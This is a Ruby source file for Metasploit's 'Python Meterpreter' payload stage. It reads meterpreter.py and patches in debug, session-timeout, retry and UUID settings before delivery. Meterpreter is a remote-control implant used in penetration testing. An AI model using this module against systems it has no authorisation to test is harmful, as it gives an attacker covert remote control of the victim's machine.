##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_python'
require 'msf/base/sessions/meterpreter_options'

module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Python Meterpreter',
      'Description'   => 'Run a meterpreter server in Python (2.5-2.7 & 3.1-3.4)',
      'Author'        => 'Spencer McIntyre',
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Python_Python
    ))
    register_advanced_options([
      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
    ], self.class)
  end

  def generate_stage(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

    if datastore['PythonMeterpreterDebug']
      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
    end

    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{datastore['SessionRetryTotal']}")
    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{datastore['SessionRetryWait']}")

    uuid = opts[:uuid] || generate_payload_uuid
    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")

    met
  end
end
